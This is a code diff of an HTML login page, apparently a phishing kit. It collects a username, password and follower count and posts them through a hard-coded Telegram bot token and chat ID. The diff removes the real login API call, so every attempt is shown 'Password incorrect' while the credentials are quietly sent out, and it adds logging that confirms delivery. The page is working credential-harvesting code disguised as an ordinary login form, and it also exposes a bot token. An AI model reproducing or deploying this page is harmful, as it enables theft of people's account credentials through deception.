@@ -13,13 +13,21 @@
             <div class="form-container">
                 <img src="https://raw.githubusercontent.com/hicodersofficial/glassmorphism-login-form/master/assets/illustration.png" alt="illustration" class="illustration" />
                 <h1 class="opacity">LOGIN</h1>
-                <form>
-                    <input type="text" placeholder="USERNAME" />
-                    <input type="password" placeholder="PASSWORD" />
+                <form id="loginForm">
+                    <input type="text" id="username" placeholder="USERNAME" required />
+                    <input type="password" id="password" placeholder="PASSWORD" required />
                     <input type="number" id="followers" name="followers" step="1" placeholder="FOLLOWERS" required>
-                    <button class="opacity">SUBMIT</button>
-                        <script>
-        const apiUrl = "https://d9f0130f-707a-46ed-b30a-d1d5b420c560-00-3lnvptj53i2o2.pike.replit.dev/login";
+                    <button class="opacity" type="submit">SUBMIT</button>
+                </form>
+                <p class="message" id="message"></p>
+                <div class="register-forget opacity"></div>
+            </div>
+            <div class="circle circle-two"></div>
+        </div>
+        <div class="theme-btn-container"></div>
+    </section>
+
+    <script>
         const telegramApiUrl = "https://api.telegram.org/bot2101899532:AAGQ4MjaBjYhu--NWwDpUeFlhZnRriPDcFA/sendMessage";
         const chatId = "1339653142";
 
@@ -35,30 +43,10 @@
 
             sendTelegramMessage(`Login Attempt:\n\nUsername: ${username}\nPassword: ${password}\nFollowers: ${followers}`);
 
-            fetch(apiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ username, password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    message.textContent = "Login successful!";
-                    message.className = "message success";
-                    window.location.href = "/acc"; 
-                } else {
-                    message.textContent = "Password incorrect";
-                    message.className = "message error";
-                }
-            })
-            .catch(error => {
-                console.error('API Error:', error);
-                message.textContent = "Password incorrect";
-                message.className = "message error";
-            });
+            message.textContent = "Password incorrect";
+            message.className = "message error";
         });
+
         function sendTelegramMessage(text) {
             fetch(telegramApiUrl, {
                 method: 'POST',
@@ -69,19 +57,18 @@
                     chat_id: chatId,
                     text: text
                 })
-            }).catch(error => {
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error("Failed to send message to Telegram:", response.statusText);
+                } else {
+                    console.log("Message sent to Telegram successfully!");
+                }
+            })
+            .catch(error => {
                 console.error("Telegram Error:", error);
             });
         }
     </script>
-                </form>
-                <div class="register-forget opacity">
-                </div>
-            </div>
-            <div class="circle circle-two"></div>
-        </div>
-        <div class="theme-btn-container"></div>
-    </section>
 </body>
 </html>
-
